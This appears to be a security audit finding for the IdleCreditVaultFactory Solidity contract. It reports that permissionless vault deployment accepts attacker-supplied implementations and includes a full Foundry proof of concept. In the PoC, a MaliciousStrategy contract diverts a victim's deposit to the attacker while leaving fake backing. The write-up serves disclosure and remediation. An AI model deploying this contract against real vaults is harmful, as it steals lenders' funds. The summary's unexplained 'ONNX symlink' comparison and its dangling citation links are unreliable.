### Title
Unpermissioned factory deployments can point vault proxies at attacker-controlled implementations and drain lender deposits - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary

`deployCreditVault` is callable by any EOA and accepts arbitrary credit-vault and strategy implementation addresses without checking an approved implementation registry. The supplied implementation behaves like the ONNX symlink target: the factory-created proxy appears to be inside the trusted deployment boundary, but all runtime logic resolves to attacker-controlled code outside that boundary.

### Finding Description

`deployCreditVault` has no caller allowlist or implementation validation beyond a non-zero manager and minimum-fee checks. [1](#0-0)  `_deployBaseCreditVault` passes both attacker-supplied implementation addresses directly into `_deployProxy`. [2](#0-1)  `_deployProxy` creates a `TransparentUpgradeableProxy` for that implementation, so subsequent calls execute arbitrary delegatecalled code. [3](#0-2) 

During legitimate credit-vault initialization, the CDO grants unlimited underlying-token allowance to the strategy and unlimited strategy-token allowance back to the strategy. [4](#0-3)  On each deposit, the CDO pulls the lender's underlying, mints tranche shares, and calls `strategy.deposit(_amount)`. [5](#0-4)  A malicious strategy implementation can therefore use the standing underlying allowance to transfer the deposited amount to the attacker while incrementing a fake `strategyToken` balance for the CDO.

Transferring proxy ownership to the honest treasury after deployment does not remove the attacker-controlled runtime code. [6](#0-5) 

### Impact Explanation

An unprivileged attacker can deploy a factory-emitted vault whose strategy implementation steals every deposit. A lender who deposits `N` underlying receives normal-looking tranche shares, the CDO records `N` strategy-token backing, and the malicious strategy moves the actual `N` underlying to the attacker.

This breaks the solvency and fair-mint invariant: tranche shares and recorded strategy backing remain, but the corresponding underlying is no longer held by the CDO, strategy, or borrower. The loss is the full deposited amount; in the PoC below it is exactly `100e6` tokens.

### Likelihood Explanation

The attack requires no privileged role, borrower action, oracle manipulation, default, timing race, or malicious manager. The attacker only needs to call the permissionless factory with a compatible malicious implementation and have one victim deposit into the resulting vault.

The victim-interaction requirement lowers likelihood relative to compromising an existing vault, but deployment is emitted as an official `CreditVaultDeployed` event and the resulting proxies have the configured treasury ownership. Keyring can also be disabled with `ancillaryParams.keyring == address(0)`, so deposits need no credential unless the deployment chooses otherwise. [7](#0-6) 

### Recommendation

Do not accept implementation addresses directly from deployment callers. Store treasury-approved implementation addresses or code hashes in the factory and deploy only those entries for the CDO, strategy, queue, programmable borrower, and write-off escrow.

At minimum:

- Add an `onlyTreasury` implementation registry.
- Reject implementations not explicitly approved.
- Emit each implementation address in `CreditVaultDeployed`.
- Prefer deploying bytecode from factory-known implementations rather than accepting arbitrary proxy targets.

Interface-level checks such as `strategyToken()` or `asset()` are insufficient because delegatecalled implementation code controls all returned values and storage.

### Proof of Concept

The following Foundry test deploys the factory on a fork, supplies a malicious strategy implementation, and shows that a victim's deposit is diverted while the CDO is left with fake strategy-token backing.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract PoCToken is ERC20 {
    constructor() ERC20("PoC USD", "pUSD") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousStrategy {
    address public token;
    address public idleCDO;
    address public manager;
    address public borrower;
    address public owner;
    uint256 public apr;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private immutable thief = msg.sender;

    function initialize(
        address _token,
        address _owner,
        address _manager,
        address _borrower,
        string memory,
        uint256 _apr
    ) external {
        token = _token;
        owner = _owner;
        manager = _manager;
        borrower = _borrower;
        apr = _apr;
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function symbol() external pure returns (string memory) {
        return "EVIL";
    }

    function name() external pure returns (string memory) {
        return "Evil Strategy";
    }

    function decimals() external view returns (uint8) {
        return IERC20Detailed(token).decimals();
    }

    function getApr() external view returns (uint256) {
        return apr;
    }

    function unscaledApr() external view returns (uint256) {
        return apr;
    }

    function setAprsWithBuffer(uint256 _apr, uint256, uint256) external {
        apr = _apr;
    }

    function setAprs(uint256, uint256 _apr) external {
        apr = _apr;
    }

    function setWhitelistedCDO(address cdo) external {
        idleCDO = cdo;
    }

    function transferOwnership(address newOwner) external {
        owner = newOwner;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function increaseAllowance(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @notice Executed by delegatecall inside the strategy proxy.
    /// msg.sender is the CDO, which already granted this proxy unlimited underlying allowance.
    function deposit(uint256 amount) external returns (uint256) {
        IERC20Detailed(token).transferFrom(msg.sender, thief, amount);
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        return amount;
    }
}

contract FactoryImplementationTraversalPoC is Test {
    bytes32 private constant DEPLOYED_TOPIC =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    function testArbitraryStrategyImplementationDrainsDeposit() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address treasury = makeAddr("treasury");
        address manager = makeAddr("manager");
        address borrower = makeAddr("borrower");
        address victim = makeAddr("victim");
        uint256 depositAmount = 100e6;

        PoCToken underlying = new PoCToken();
        ProxyAdmin proxyAdmin = new ProxyAdmin();

        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(factoryImpl),
                    address(proxyAdmin),
                    abi.encodeWithSelector(
                        IdleCreditVaultFactory.initialize.selector,
                        treasury,
                        address(proxyAdmin)
                    )
                )
            )
        );

        MaliciousStrategy maliciousImpl = new MaliciousStrategy();
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImpl),
                limit: 0,
                underlying: address(underlying),
                apr: 12e18,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 hours,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: treasury,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(maliciousImpl),
                manager: manager,
                borrower: borrower,
                borrowerName: "PoC"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        address cdo;
        address strategy;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == DEPLOYED_TOPIC) {
                (cdo, strategy,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        require(cdo != address(0), "vault not deployed");

        underlying.mint(victim, depositAmount);
        vm.prank(victim);
        underlying.approve(cdo, depositAmount);

        vm.prank(victim);
        uint256 minted = IdleCDOEpochVariant(cdo).depositAA(depositAmount);

        assertEq(minted, depositAmount);
        assertEq(underlying.balanceOf(address(maliciousImpl)), 0);

        // The proxy executed malicious code and moved the underlying to the implementation deployer.
        assertEq(underlying.balanceOf(address(this)), depositAmount);

        // Fake strategy-token backing remains credited to the CDO.
        assertEq(MaliciousStrategy(strategy).balanceOf(cdo), depositAmount);

        // Neither the CDO nor the strategy retains the victim's underlying.
        assertEq(underlying.balanceOf(cdo), 0);
        assertEq(underlying.balanceOf(strategy), 0);
    }
}
```

The test demonstrates a full deposit theft and resulting insolvency of `100e6` underlying.
